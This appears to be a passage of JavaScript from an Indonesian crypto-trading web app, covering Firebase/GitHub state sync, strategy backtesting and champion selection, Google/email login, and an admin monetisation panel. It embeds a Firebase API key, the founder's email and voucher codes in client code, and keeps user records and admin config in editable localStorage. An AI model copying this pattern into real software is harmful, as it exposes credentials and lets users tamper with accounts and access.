    function qbIsNodeDaemon() {
        return typeof process !== 'undefined' && !!(process.release && process.release.name === 'node');
    }
    async function qbFirebaseWriteAuthQuery() {
        if (qbIsNodeDaemon()) return '';
        if (!isCurrentUserAdmin() || !fbAuthInstance || !fbAuthInstance.currentUser) return null;
        const idToken = await fbAuthInstance.currentUser.getIdToken();
        return '?auth=' + encodeURIComponent(idToken);
    }

    async function qbFirebaseSyncAll() {
        try {
            const authQuery = await qbFirebaseWriteAuthQuery();
            if (authQuery == null) return false; // bukan admin terautentikasi: tidak menulis
            const now = Date.now();
            const payload = {
                projectId: QB_FIREBASE_PROJECT_ID,
                senderId: QB_FIREBASE_SENDER_ID,
                updatedAt: now,
                version: '2.5',
                engineV: 2,
                champion: brain.champion,
                learned: brain.learned,
                weights: brain.weights,
                bayesian: brain.bayesian,
                stats: brain.stats,
                activeSignals: brain.signals.slice(0, 40),
                recentJournal: brain.journal.slice(0, 40)
            };
            const r = await fetch(QB_FIREBASE_RTDB_URL + '/quantBrain/liveState.json' + authQuery, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            return !!(r && r.ok);
        } catch (e) { return false; }
    }

    async function qbFirebaseLoad() {
        try {
            const r = await fetch(QB_FIREBASE_RTDB_URL + '/quantBrain/liveState.json?cb=' + Date.now(), { cache: 'no-store' });
            if (!r || !r.ok) return false;
            const remote = safeJsonParse(await r.text(), null);
            if (!remote || !remote.updatedAt) return false;
            const localUpdated = brain.journal.length ? (brain.journal[0].t || 0) : 0;
            if (remote.updatedAt <= localUpdated && brain.signals.length) return false;
            if (remote.engineV === 2) {
                if (remote.learned) brain.learned = Object.assign({}, brain.learned, remote.learned);
                if (remote.weights) brain.weights = Object.assign({}, brain.weights, remote.weights);
                if (remote.bayesian) brain.bayesian = Object.assign({}, brain.bayesian, remote.bayesian);
                if (remote.champion) brain.champion = remote.champion;
            }
            if (Array.isArray(remote.activeSignals)) {
                const ids = new Set(brain.signals.map(s => s.id));
                remote.activeSignals.forEach(s => { if (!ids.has(s.id)) brain.signals.push(s); });
            }
            saveBrain();
            return true;
        } catch (e) { return false; }
    }

    let qbSyncTimer = null;
    function qbScheduleSync() {
        if (qbSyncTimer) clearTimeout(qbSyncTimer);
        qbSyncTimer = setTimeout(() => {
            if (qbGithubToken()) qbGithubSyncAll().catch(() => {});
            qbFirebaseSyncAll().catch(() => {});
        }, 25000);
    }
    async function qbGithubSyncAll() {
        const token = qbGithubToken();
        if (!token) return false;
        const now = Date.now();
        const ls = { version: '2.5', updatedAt: now, brain: brain };
        const aj = { updatedAt: now, totalSignals: brain.signals.length, closed: brain.stats.closed, wins: brain.stats.wins, losses: brain.stats.losses, winRatePct: brain.stats.closed ? Math.round(brain.stats.wins / brain.stats.closed * 1000) / 10 : null, netR: brain.stats.netR, backtestOOS: brain.stats.backtestOOS || { trades: 0, netR: 0, winRatePct: null }, proof: 'Accuracy computed only from real tracked signals vs real prices.' };
        const sw = { weights: brain.weights, updatedAt: now };
        const tj = { trades: brain.signals.filter(s => s.status === 'WIN' || s.status === 'LOSS'), updatedAt: now };
        const results = await Promise.all([
            qbGithubPut('learning_state.json', JSON.stringify(ls, null, 2)),
            qbGithubPut('accuracy_report.json', JSON.stringify(aj, null, 2)),
            qbGithubPut('strategy_weights.json', JSON.stringify(sw, null, 2)),
            qbGithubPut('trade_journal.json', JSON.stringify(tj, null, 2))
        ]);
        return results.every(Boolean);
    }
    async function qbFetchFearGreed() {
        try {
            const r = await fetch('https://api.alternative.me/fng/?limit=1', { cache: 'no-store' });
            if (!r.ok) return null;
            const j = await r.json();
            const d = (j && j.data && j.data[0]) || null;
            if (!d) return null;
            return { value: parseInt(d.value, 10), classification: d.value_classification, t: Date.now() };
        } catch (e) { return null; }
    }

    /* ═══════════════ 9. LEARNING CYCLE & CONTINUOUS EVOLUTIONARY OPTIMIZER ═══════════════ */
    /* Seleksi champion yang dikoreksi untuk "keberuntungan": memilih yang terbaik dari 10 strategi pasti
       menghasilkan satu yang tampak bagus secara kebetulan. Champion dinilai dari t-stat ekspektansi R
       (net biaya, out-of-sample) dikurangi hurdle sqrt(2 ln N) = t maksimum yang diharapkan dari N strategi tanpa edge. */
    const QB_CHAMP_MIN_TRADES = 30, QB_CHAMP_MIN_SYMBOLS = 3;

    function qbEmptyChampion() {
        return { id: null, name: 'Belum ada strategi yang lolos uji', book: '-', netR: 0, trades: 0, winRate: 0, pf: 0, expPerTrade: 0, tStat: 0, deflatedT: 0, significant: false };
    }

    function recomputeChampionStrategy() {
        const cands = [];
        QB_STRATS.forEach(st => {
            const per = brain.leaderboard[st.id] || {};
            let netR = 0, trades = 0, wins = 0, sumR2 = 0, gW = 0, gL = 0, syms = 0;
            Object.values(per).forEach(r => {
                if (r && r.dataStatus === 'LIVE' && r.trades > 0 && r.sumR2 != null) {
                    netR += r.netR; trades += r.trades; wins += r.wins || 0; sumR2 += r.sumR2;
                    gW += r.grossW || 0; gL += r.grossL || 0; syms++;
                }
            });
            if (!trades) return;
            const mean = netR / trades;
            const sd = trades > 1 ? Math.sqrt(Math.max(0, (sumR2 - trades * mean * mean) / (trades - 1))) : 0;
            cands.push({ st, netR, trades, wins, mean, syms, tStat: sd > 0 ? (mean / sd) * Math.sqrt(trades) : 0, pf: gL > 0 ? gW / gL : (gW > 0 ? 99 : 0) });
        });
        const hurdle = Math.sqrt(2 * Math.log(Math.max(2, QB_STRATS.length)));
        let best = null;
        cands.filter(c => c.trades >= QB_CHAMP_MIN_TRADES && c.syms >= QB_CHAMP_MIN_SYMBOLS).forEach(c => {
            c.deflatedT = c.tStat - hurdle;
            if (!best || c.deflatedT > best.deflatedT) best = c;
        });
        if (best) {
            brain.champion = {
                id: best.st.id, name: best.st.name, book: best.st.book,
                netR: Math.round(best.netR * 100) / 100,
                trades: best.trades,
                winRate: Math.round((best.wins / best.trades) * 1000) / 10,
                pf: Math.round(Math.min(99, best.pf) * 100) / 100,
                expPerTrade: Math.round(best.mean * 1000) / 1000,
                tStat: Math.round(best.tStat * 100) / 100,
                deflatedT: Math.round(best.deflatedT * 100) / 100,
                hurdle: Math.round(hurdle * 100) / 100,
                significant: best.deflatedT > 0 && best.mean > 0,
                updatedAt: Date.now(), gen: brain.gen
            };
        } else {
            brain.champion = Object.assign(qbEmptyChampion(), { updatedAt: Date.now(), gen: brain.gen });
        }
        return brain.champion;
    }

    function qbChampionLabel(champ) {
        champ = champ || qbEmptyChampion();
        if (!champ.id) return champ.name;
        return champ.name + (champ.significant ? '' : ' (BELUM SIGNIFIKAN)');
    }

    async function qbOptimizeBatch() {
        const syms = QB_UNIVERSE.slice(brain.optCursor, brain.optCursor + QB_OPT_BATCH).map(a => a.sym);
        if (!syms.length) { brain.optCursor = 0; return qbOptimizeBatch(); }
        const btOpts = { feeBps: brain.params.feeBps, slipBps: brain.params.slipBps, atrMult: brain.learned.atrMult, tp1Ratio: brain.learned.tp1Ratio };
        for (const sym of syms) {
            const asset = QB_BY_SYM[sym];
            try {
                const k = await qbFetchCandles(asset, true);
                const ind = buildIndicators(k);
                QB_STATE.ema4h = aggEma(ind, 20, 4);
                const regime = detectRegime(ind, ind.c.length - 2);
                brain.lastHurst = ind.hurst || 0.58;
                QB_STRATS.forEach(st => {
                    if (!brain.leaderboard[st.id]) brain.leaderboard[st.id] = {};
                    try {
                        const bt = backtestStrategy(st.id, k, ind, btOpts);
                        bt.regime = regime; bt.dataStatus = 'LIVE';
                        brain.leaderboard[st.id][sym] = bt;
                        brain.stats.backtests++;
                        // Posterior Bayesian sengaja TIDAK diperbarui dari backtest: backtest yang sama diulang
                        // tiap siklus sehingga akan terhitung berkali-kali. Bayesian hanya dari hasil sinyal live.
                    } catch (e) {
                        brain.leaderboard[st.id][sym] = { dataStatus: 'OFFLINE', trades: 0, winRate: 0, pf: 0, exp: 0, netR: 0, maxDD: 0 };
                    }
                });
            } catch (e) {
                QB_STRATS.forEach(st => {
                    if (!brain.leaderboard[st.id]) brain.leaderboard[st.id] = {};
                    brain.leaderboard[st.id][sym] = { dataStatus: 'OFFLINE', trades: 0, winRate: 0, pf: 0, exp: 0, netR: 0, maxDD: 0 };
                });
            }
        }
        brain.optCursor += QB_OPT_BATCH;
        recomputeChampionStrategy();
        if (brain.optCursor >= QB_UNIVERSE.length) {
            brain.optCursor = 0;
            brain.gen++;
            brain.lastOptAt = Date.now();
            QB_STRATS.forEach(st => {
                const per = brain.leaderboard[st.id] || {};
                let exps = 0, n = 0;
                Object.values(per).forEach(r => { if (r && r.dataStatus === 'LIVE' && r.trades >= 5) { exps += r.exp; n++; } });
                if (n > 0) {
                    const avgExp = exps / n;
                    const target = Math.max(0.35, Math.min(2.4, 1 + avgExp * 1.6));
                    brain.weights[st.id] = Math.round((brain.weights[st.id] * 0.6 + target * 0.4) * 100) / 100;
                }
            });
            const champ = recomputeChampionStrategy();
            qbJournal('GEN', '[GEN #' + brain.gen + '] Universe penuh di-backtest out-of-sample (net fee+slippage) | Champion: ' + qbChampionLabel(champ) +
                (champ.id ? ' (' + (champ.netR >= 0 ? '+' : '') + champ.netR + 'R, ' + champ.trades + ' trade, Win ' + champ.winRate + '%, t=' + champ.tStat + ' vs hurdle ' + champ.hurdle + ')' : ''));
            if (brain.signals.length === 0 && brain.gen >= 2) {
                // Sengaja TIDAK menurunkan minScore otomatis: lebih baik tanpa sinyal daripada sinyal berkualitas rendah.
                qbJournal('GEN', '[INFO] Belum ada setup yang lolos ambang ' + brain.params.minScore + '/100. Engine tetap menunggu.');
            }
            saveBrain();
        }
    }

    async function qbForceEvolutionaryStep() {
        qbSetStatus('EVOLUSI MENDALAM…', 'pulse');
        await qbBrainCycle(true);
        const champ = recomputeChampionStrategy();
        if (champ && champ.significant && brain.weights[champ.id]) {
            brain.weights[champ.id] = Math.min(2.6, Math.round((brain.weights[champ.id] * 1.12) * 100) / 100);
        }
        brain.gen++;
        qbJournal('GEN', '[DEEP EVAL #' + brain.gen + '] ' + (champ && champ.significant
            ? 'Bobot ditambah untuk champion yang signifikan secara statistik: ' + champ.name + '.'
            : 'Belum ada champion yang signifikan secara statistik, bobot tidak dikonsentrasikan.'));
        saveBrain();
        qbRenderAll();
        recalcQuantProfitPlan();
        if (typeof showToast === 'function') showToast('Deep Self-Evaluation selesai. Champion: ' + qbChampionLabel(champ), 'ok');
    }

    function qbAccuracy() { return brain.stats.closed ? (brain.stats.wins + brain.stats.be) / brain.stats.closed * 100 : 0; }

    let cycleBusy = false;
    async function qbBrainCycle(manual) {
        if (cycleBusy) return; cycleBusy = true;
        try {
            qbSetStatus(manual ? 'MANUAL SCAN BERJALAN…' : 'BELAJAR…', 'pulse');
            await qbEvaluateOpenSignals();
            if (Date.now() - brain.news.fetchedAt > QB_NEWS_STALE || brain.news.fetchedAt === 0) { qbSetStatus('MEMBACA BERITA TIER-1…', 'pulse'); await qbNewsCycle(); }
            if (Date.now() - (brain.whale.fetchedAt || 0) > 30 * 60 * 1000 || !(brain.whale.fetchedAt)) { qbSetStatus('MEMBACA POSISI WHALE…', 'pulse'); await qbWhaleCycle(); }
            qbSetStatus('BACKTEST WALK-FORWARD…', 'pulse');
            await qbOptimizeBatch();
            qbSetStatus('SCANNING SINYAL…', 'pulse');
            const scanSyms = QB_UNIVERSE.slice(brain.scanCursor, brain.scanCursor + QB_SCAN_BATCH).map(a => a.sym);
            brain.scanCursor = (brain.scanCursor + QB_SCAN_BATCH) % QB_UNIVERSE.length;
            await qbScanSymbols(scanSyms.length ? scanSyms : QB_UNIVERSE.slice(0, QB_SCAN_BATCH).map(a => a.sym));
            brain.cycles++;
            qbJournal('CYCLE', '[CYCLE #' + brain.cycles + '] Evaluasi sinyal vs harga riil, berita tier-1, Kalman+Hurst, & 10 strategi selesai.');
            nextCycleAt = Date.now() + QB_CYCLE_MS;
        } catch (e) {
            qbJournal('ERR', '[WARN] Siklus terganggu: ' + (e && e.message ? e.message : e));
        } finally {
            cycleBusy = false;
            saveBrain(); qbRenderAll(); recalcQuantProfitPlan();
            qbSetStatus(brain.running ? 'AUTO-LEARNING AKTIF' : 'IDLE', brain.running ? 'on' : 'off');
        }
    }

    /* ═══════════════════════════════════════════════════════════════════════════
       10. MULTI-USER ZERO-TRUST AUTHENTICATION (GOOGLE + EMAIL) & SCOPED VAULT
    ═══════════════════════════════════════════════════════════════════════════ */
    const AUTH_USERS_KEY = 'pilusAuthUsersRegistryV2';
    const AUTH_SESSION_KEY = 'pilusActiveAuthSessionV2';
    let currentUser = null;

    /* 10A. FIREBASE AUTHENTICATION ASLI (Google Sign-In)
       Status admin HANYA diberikan dari callback onAuthStateChanged Firebase, ketika ID token Google
       milik QB_ADMIN_EMAIL dengan emailVerified === true. Tidak ada password admin, tidak ada jalur email. */
    const QB_FIREBASE_WEB_CONFIG = {
        apiKey: 'AIzaSyAeJs7zb1UwB372hmxbZv_VJbEmbKY5Qxo',
        authDomain: 'pilusfinance.firebaseapp.com',
        projectId: 'pilusfinance',
        storageBucket: 'pilusfinance.firebasestorage.app',
        messagingSenderId: '821263795912',
        appId: '1:821263795912:web:d48b119cdbe2f2baa187fd'
    };
    const QB_FIREBASE_SDK = 'https://www.gstatic.com/firebasejs/10.12.2/';
    let fbAuthApi = null, fbAuthInstance = null, fbAuthInitPromise = null;
    let firebaseVerifiedAdminUid = null; // hanya diisi oleh handleFirebaseAuthState (closure privat)

    function canUseFirebaseAuth() {
        return typeof location !== 'undefined' && /^https?:$/.test(location.protocol || '');
    }

    function initFirebaseAuth() {
        if (fbAuthInitPromise) return fbAuthInitPromise;
        if (!canUseFirebaseAuth()) return Promise.reject(new Error('auth/unsupported-origin'));
        fbAuthInitPromise = (async () => {
            const appMod = await import(QB_FIREBASE_SDK + 'firebase-app.js');
            const authMod = await import(QB_FIREBASE_SDK + 'firebase-auth.js');
            const app = appMod.getApps().length ? appMod.getApp() : appMod.initializeApp(QB_FIREBASE_WEB_CONFIG);
            fbAuthApi = authMod;
            fbAuthInstance = authMod.getAuth(app);
            authMod.onAuthStateChanged(fbAuthInstance, handleFirebaseAuthState);
            return fbAuthInstance;
        })().catch(e => { fbAuthInitPromise = null; throw e; });
        return fbAuthInitPromise;
    }

    function handleFirebaseAuthState(fbUser) {
        if (fbUser && fbUser.email) {
            const email = String(fbUser.email).trim().toLowerCase();
            firebaseVerifiedAdminUid = (email === QB_ADMIN_EMAIL && fbUser.emailVerified === true) ? fbUser.uid : null;
            establishGoogleSession(email, fbUser.displayName, fbUser.uid);
        } else {
            firebaseVerifiedAdminUid = null;
            if (currentUser && currentUser.provider === 'GOOGLE') setActiveSession(null);
            else renderAuthAndAdminUI();
        }
    }

    function describeFirebaseAuthError(e) {
        const code = (e && (e.code || e.message)) || '';
        if (code.includes('unsupported-origin')) return 'Login Google hanya berjalan di https://pilusfinance.web.app atau http://localhost (bukan file:// lokal).';
        if (code.includes('operation-not-allowed')) return 'Provider Google belum diaktifkan di Firebase Console > Authentication > Sign-in method.';
        if (code.includes('unauthorized-domain')) return 'Domain ini belum terdaftar di Firebase Console > Authentication > Settings > Authorized domains.';
        if (code.includes('popup-blocked')) return 'Popup diblokir browser. Izinkan popup untuk situs ini lalu coba lagi.';
        if (code.includes('network-request-failed')) return 'Jaringan gagal menghubungi Firebase Auth.';
        return 'Login Google gagal: ' + code;
    }

    function startGoogleSignIn() {
        const run = (auth) => {
            const provider = new fbAuthApi.GoogleAuthProvider();
            provider.setCustomParameters({ prompt: 'select_account' });
            return fbAuthApi.signInWithPopup(auth, provider);
        };
        // Panggil signInWithPopup secara sinkron bila SDK sudah siap agar popup tidak diblokir (user gesture).
        const p = fbAuthInstance ? run(fbAuthInstance) : initFirebaseAuth().then(run);
        return p.then(() => { if (typeof window !== "undefined" && window.closeAuthModal) window.closeAuthModal(); return true; }).catch(e => {
            const code = (e && e.code) || '';
            if (code.includes('popup-closed-by-user') || code.includes('cancelled-popup-request')) return false;
            if (typeof showToast === 'function') showToast(describeFirebaseAuthError(e), 'err');
            return false;
        });
    }

    function getDefaultUsersRegistry() {
        const rootAdmin = {
            uid: 'uid_admin_pilusatrio',
            email: QB_ADMIN_EMAIL,
            name: 'Pilusatrio — Founder & Root Admin',
            provider: 'GOOGLE',
            role: 'ADMIN',
            tier: 'VIP',
            status: 'ACTIVE',
            passDigest: null, // admin tidak punya password: hanya Google Sign-In via Firebase Auth
            expiresAt: 'LIFETIME',
            createdAt: Date.now() - 86400000 * 90
        };
        rootAdmin.hmacSeal = signSessionObject(rootAdmin);
        return [rootAdmin];
    }

    function loadUsersRegistry() {
        try {
            const raw = localStorage.getItem(AUTH_USERS_KEY);
            if (!raw) {
                const def = getDefaultUsersRegistry();
                localStorage.setItem(AUTH_USERS_KEY, JSON.stringify(def));
                return def;
            }
            const parsed = safeJsonParse(raw, null);
            if (!Array.isArray(parsed) || !parsed.length) return getDefaultUsersRegistry();
            // Ensure every user has a valid integrity seal or re-seal legitimate records
            const validList = [];
            parsed.forEach(u => {
                if (!u || !u.email) return;
                if (!u.passDigest && u.passHash) {
                    u.passDigest = hashPasswordSync(u.email, u.passHash);
                    delete u.passHash; // Never keep plaintext password in storage!
                }
                if (String(u.email).toLowerCase() === QB_ADMIN_EMAIL) {
                    u.passDigest = null; // hapus digest password admin lama (seed bawaan versi sebelumnya)
                    u.provider = 'GOOGLE';
                }
                if (!u.hmacSeal) u.hmacSeal = signSessionObject(u);
                validList.push(u);
            });
            if (!validList.some(u => u.email.toLowerCase() === QB_ADMIN_EMAIL)) {
                validList.unshift(getDefaultUsersRegistry()[0]);
            }
            return validList;
        } catch (e) { return getDefaultUsersRegistry(); }
    }

    function saveUsersRegistry(list) {
        try {
            list.forEach(u => {
                delete u.passHash; // Enforce zero plaintext password in storage
                u.hmacSeal = signSessionObject(u);
            });
            localStorage.setItem(AUTH_USERS_KEY, JSON.stringify(list));
        } catch (e) { }
    }

    function userScopeKey(suffix) {
        const emailKey = currentUser && currentUser.email ? currentUser.email.toLowerCase().replace(/[^a-z0-9@._-]/g, '_') : 'guest_default';
        return 'pf_u_' + emailKey + '_' + suffix;
    }

    function isCurrentUserAdmin() {
        if (!currentUser || !currentUser.email) return false;
        if (currentUser.email.toLowerCase().trim() !== QB_ADMIN_EMAIL) return false;
        // Wajib: sesi berasal dari Firebase Auth Google dengan email terverifikasi (bukan input manual).
        if (!firebaseVerifiedAdminUid || currentUser.fbUid !== firebaseVerifiedAdminUid) return false;
        // Must ALSO pass cryptographic HMAC session seal verification!
        return verifySessionIntegrity(currentUser);
    }

    function checkAuthRateLimit(emailKey) {
        const now = Date.now();
        const rec = authRateLimitMap.get(emailKey) || { fails: 0, lockUntil: 0 };
        if (rec.lockUntil > now) {
            securityTelemetry.bruteForceBlocked++;
            const waitSec = Math.ceil((rec.lockUntil - now) / 1000);
            adminLogEvent('BRUTE_FORCE_LOCKOUT', `Login ${emailKey} dikunci sementara (${waitSec}s tersisa)`);
            return { allowed: false, waitSec };
        }
        return { allowed: true, rec };
    }

    function recordAuthFailure(emailKey) {
        const now = Date.now();
        const rec = authRateLimitMap.get(emailKey) || { fails: 0, lockUntil: 0 };
        rec.fails++;
        if (rec.fails >= 5) {
            rec.lockUntil = now + 30000 * Math.pow(2, Math.min(4, rec.fails - 5));
            securityTelemetry.bruteForceBlocked++;
            adminLogEvent('BRUTE_FORCE_LOCKOUT', `5x gagal login pada ${emailKey} -> Rate limiter aktif`);
        }
        authRateLimitMap.set(emailKey, rec);
    }

    function saveCurrentUserWorkstate() {
        try {
            // Strip any accidental plaintext fields before writing to localStorage
            const sanitizedExchanges = {};
            Object.keys(userExchangeConfigs).forEach(k => {
                const c = Object.assign({}, userExchangeConfigs[k]);
                delete c.apiKey;
                delete c.secretRaw;
                delete c.extra;
                sanitizedExchanges[k] = c;
            });
            localStorage.setItem(userScopeKey('exchanges'), JSON.stringify(sanitizedExchanges));
            localStorage.setItem(userScopeKey('live_positions'), JSON.stringify(liveExchangePositions));
            if (typeof window.portfolio !== 'undefined') {
                localStorage.setItem(userScopeKey('portfolio'), JSON.stringify(window.portfolio));
            }
            updateSecurityDashboardUI();
        } catch (e) { }
    }

    function loadCurrentUserWorkstate() {
        try {
            const exRaw = localStorage.getItem(userScopeKey('exchanges'));
            userExchangeConfigs = exRaw ? (safeJsonParse(exRaw, {}) || {}) : {};
            const posRaw = localStorage.getItem(userScopeKey('live_positions'));
            liveExchangePositions = posRaw ? (safeJsonParse(posRaw, []) || []) : [];

            const portRaw = localStorage.getItem(userScopeKey('portfolio'));
            if (portRaw && typeof window.portfolio !== 'undefined' && typeof window.renderPortfolio === 'function') {
                window.portfolio = safeJsonParse(portRaw, []) || [];
                window.renderPortfolio();
            }
        } catch (e) {
            userExchangeConfigs = {};
            liveExchangePositions = [];
        }
    }

    function setActiveSession(userObj) {
        if (userObj) {
            delete userObj.passHash;
            userObj.hmacSeal = signSessionObject(userObj);
            currentUser = userObj;
            try { localStorage.setItem(AUTH_SESSION_KEY, JSON.stringify(userObj)); } catch (e) { }
        } else {
            currentUser = null;
            privateMemoryVault.clear(); // Zeroize decrypted secrets in RAM on logout
            try { localStorage.removeItem(AUTH_SESSION_KEY); } catch (e) { }
        }
        loadCurrentUserWorkstate();
        renderAuthAndAdminUI();
        renderExchangeGatewayUI();
        probeAutoLocalEngine().then(function (isUp) {
            if (isUp && typeof location !== "undefined" && (location.hostname === "127.0.0.1" || location.hostname === "localhost")) {
                syncStateWithLocalRelay(false).catch(function () {});
            }
        }).catch(function () {});
        recalcQuantProfitPlan();
        updateSecurityDashboardUI();
    }

    function loginWithEmail(email, password) {
        const atk = detectAndBlockAttack(email, 'AuthEmail');
        if (atk.blocked) {
            if (typeof showToast === 'function') showToast('Input berbahaya diblokir oleh Zero-Trust Firewall!', 'err');
            return null;
        }
        const cleanEmail = String(email || '').trim().toLowerCase();
        if (!cleanEmail || !cleanEmail.includes('@')) {
            if (typeof showToast === 'function') showToast('Masukkan alamat email yang valid', 'err');
            return null;
        }
        const rl = checkAuthRateLimit(cleanEmail);
        if (!rl.allowed) {
            if (typeof showToast === 'function') showToast(`Terlalu banyak percobaan gagal. Tunggu ${rl.waitSec} detik.`, 'err');
            return null;
        }

        if (cleanEmail === QB_ADMIN_EMAIL) {
            if (typeof showToast === 'function') showToast('Akun admin hanya bisa masuk lewat tombol Google Sign-In.', 'err');
            return null;
        }
        if (!password) {
            if (typeof showToast === 'function') showToast('Masukkan password akun.', 'err');
            return null;
        }

        const users = loadUsersRegistry();
        let u = users.find(x => x.email.toLowerCase() === cleanEmail);
        if (!u) {
            recordAuthFailure(cleanEmail);
            if (typeof showToast === 'function') showToast('Akun belum terdaftar. Gunakan tab "Daftar Akun".', 'err');
            return null;
        }
        if (u.status === 'SUSPENDED') {
            if (typeof showToast === 'function') showToast('Akun ini sedang ditangguhkan oleh Admin.', 'err');
            return null;
        }
        if (!u.passDigest) {
            if (typeof showToast === 'function') showToast('Akun ini terdaftar lewat Google. Gunakan tombol Google Sign-In.', 'err');
            return null;
        }
        const inputDigest = hashPasswordSync(cleanEmail, password);
        if (!constantTimeEquals(u.passDigest, inputDigest)) {
            recordAuthFailure(cleanEmail);
            if (typeof showToast === 'function') showToast('Password akun tidak cocok.', 'err');
            return null;
        }
        authRateLimitMap.delete(cleanEmail);
        u.role = 'USER';
        setActiveSession(u);
        adminLogEvent('AUTH_LOGIN', `${u.email} login via ${u.provider} (Role: ${u.role}, Seal: ${u.hmacSeal.slice(0, 10)})`);
        if (typeof showToast === 'function') {
            showToast(isCurrentUserAdmin() ? 'Selamat datang Founder Admin pilusatrio@gmail.com — Panel Admin Terbuka!' : `Login berhasil sebagai ${u.email}`, 'ok');
        }
        return u;
    }

    function registerWithEmail(name, email, password) {
        if (detectAndBlockAttack(name, 'RegName').blocked || detectAndBlockAttack(email, 'RegEmail').blocked) {
            if (typeof showToast === 'function') showToast('Karakter injeksi berbahaya diblokir!', 'err');
            return null;
        }
        const cleanEmail = String(email || '').trim().toLowerCase();
        if (!cleanEmail || !cleanEmail.includes('@')) {
            if (typeof showToast === 'function') showToast('Format email tidak valid', 'err');
            return null;
        }
        if (cleanEmail === QB_ADMIN_EMAIL) {
            if (typeof showToast === 'function') showToast('Email admin tidak bisa didaftarkan manual. Gunakan Google Sign-In.', 'err');
            return null;
        }
        if (!password || String(password).length < 8) {
            if (typeof showToast === 'function') showToast('Password minimal 8 karakter.', 'err');
            return null;
        }
        const users = loadUsersRegistry();
        if (users.some(x => x.email.toLowerCase() === cleanEmail)) {
            // Jangan menimpa password akun yang sudah ada (mencegah pengambilalihan akun).
            if (typeof showToast === 'function') showToast('Email sudah terdaftar. Silakan login.', 'err');
            return null;
        }
        const existing = {
            uid: 'uid_' + Date.now(),
            email: cleanEmail,
            name: sanitizeInputStrict(name || cleanEmail.split('@')[0]),
            provider: 'EMAIL',
            role: 'USER',
            tier: 'FREE',
            status: 'ACTIVE',
            passDigest: hashPasswordSync(cleanEmail, password),
            expiresAt: 'FREE_TIER',
            createdAt: Date.now()
        };
        users.push(existing);
        saveUsersRegistry(users);
        setActiveSession(existing);
        adminLogEvent('AUTH_REGISTER', `Registrasi akun terenkripsi PBKDF2: ${existing.email}`);
        if (typeof showToast === 'function') showToast(`Akun ${existing.email} berhasil dibuat & diaktifkan!`, 'ok');
        return existing;
    }

    // Dipanggil HANYA dari handleFirebaseAuthState (hasil Firebase Auth asli). Tidak diekspor ke window.
    function establishGoogleSession(email, displayName, fbUid) {
        if (detectAndBlockAttack(email, 'GoogleEmail').blocked || detectAndBlockAttack(displayName || '', 'GoogleName').blocked) {
            return null;
        }
        const cleanEmail = String(email || '').trim().toLowerCase();
        if (!cleanEmail) return null;
        const users = loadUsersRegistry();
        const isAdm = cleanEmail === QB_ADMIN_EMAIL && firebaseVerifiedAdminUid === fbUid;
        let u = users.find(x => x.email.toLowerCase() === cleanEmail);
        if (!u) {
            u = {
                uid: 'goog_' + Date.now(),
                email: cleanEmail,
                name: sanitizeInputStrict(displayName || (isAdm ? 'Pilusatrio — Founder Admin' : cleanEmail.split('@')[0])),
                provider: 'GOOGLE',
                role: isAdm ? 'ADMIN' : 'USER',
                tier: isAdm ? 'VIP' : 'FREE',
                status: 'ACTIVE',
                passDigest: null,
                expiresAt: isAdm ? 'LIFETIME' : 'FREE_TIER',
                createdAt: Date.now()
            };
            users.push(u);
        } else {
            if (u.status === 'SUSPENDED') {
                if (typeof showToast === 'function') showToast('Akun ini sedang ditangguhkan oleh Admin.', 'err');
                return null;
            }
            u.provider = 'GOOGLE';
            u.role = isAdm ? 'ADMIN' : 'USER';
            if (isAdm) u.tier = 'VIP';
        }
        u.fbUid = fbUid;
        saveUsersRegistry(users);
        setActiveSession(u);
        adminLogEvent('GOOGLE_OAUTH', `${u.email} terautentikasi melalui Google OAuth 2.0`);
        if (typeof showToast === 'function') {
            showToast(isCurrentUserAdmin() ? 'Google Auth Terverifikasi: pilusatrio@gmail.com (Admin Panel Aktif!)' : `Google OAuth berhasil: ${u.email}`, 'ok');
        }
        return u;
    }

    function logoutCurrentUser() {
        const prevEmail = currentUser ? currentUser.email : 'guest';
        firebaseVerifiedAdminUid = null;
        if (fbAuthApi && fbAuthInstance && fbAuthInstance.currentUser) {
            try { fbAuthApi.signOut(fbAuthInstance).catch(() => { }); } catch (e) { }
        }
        setActiveSession(null);
        adminLogEvent('AUTH_LOGOUT', `${prevEmail} keluar & RAM Vault dibersihkan`);
        closeAuthModal();
        if (typeof showToast === 'function') showToast('Anda telah keluar dari sesi akun.', 'info');
    }

    /* ═══════════════ 11. ADMIN COMMAND CENTER (EXCLUSIVELY pilusatrio@gmail.com) ═══════════════ */
    const ADMIN_CONFIG_KEY = 'pilusAdminMonetizationConfigV2';
    let adminConfig = {
        proPriceIdr: 299000,
        apexPriceIdr: 990000,
        freeMaxEx: 1,
        proMaxEx: 5,
        apexMaxEx: 16,
        freeAutoExec: false,
        paymentGatewayKey: 'MIDTRANS_PROD_PILUSFINANCE_ACTIVE',
        cryptoWallet: 'TQuantPilusatrioInstitutionalVault99x',
        globalKillSwitch: false,
        broadcastBanner: 'PILUSFINANCE QUANT v12.5 — Zero-Trust AES-256 Vault & Eksekusi 16 Bursa Aktif.',
        vouchers: [
            { code: 'PILUSVIP2026', tier: 'VIP', usesLeft: 50 },
            { code: 'QUANTPRO50', tier: 'PRO', usesLeft: 100 }
        ],
        auditLog: []
    };

    function loadAdminConfig() {
        try {
            const raw = localStorage.getItem(ADMIN_CONFIG_KEY);
            if (raw) {
                const parsed = safeJsonParse(raw, null);
                if (parsed) adminConfig = Object.assign(adminConfig, parsed);
            }
        } catch (e) { }
    }
    function saveAdminConfig() {
        try { localStorage.setItem(ADMIN_CONFIG_KEY, JSON.stringify(adminConfig)); } catch (e) { }
    }
    function adminLogEvent(type, detail) {
        adminConfig.auditLog.unshift({ t: Date.now(), type: sanitizeInputStrict(type), detail: sanitizeInputStrict(detail) });
        if (adminConfig.auditLog.length > 120) adminConfig.auditLog.length = 120;
        saveAdminConfig();
        renderAdminAuditLog();
    }

    function renderAuthAndAdminUI() {
        const avatarEl = document.getElementById('pfUserAvatar');
        const nameEl = document.getElementById('pfUserDisplayName');
        const tierEl = document.getElementById('pfUserTierBadge');
        const emailEl = document.getElementById('pfUserEmailLabel');
        const topAuthBtnLbl = document.getElementById('pfTopAuthBtnLabel');
        const topAdminBtn = document.getElementById('pfTopAdminBtn');
        const adminSection = document.getElementById('admin-command-section');
        const activeBox = document.getElementById('pfAuthActiveSessionBox');
        const modalEmail = document.getElementById('pfModalActiveEmail');

        const isAdmin = isCurrentUserAdmin();

        if (currentUser && verifySessionIntegrity(currentUser)) {
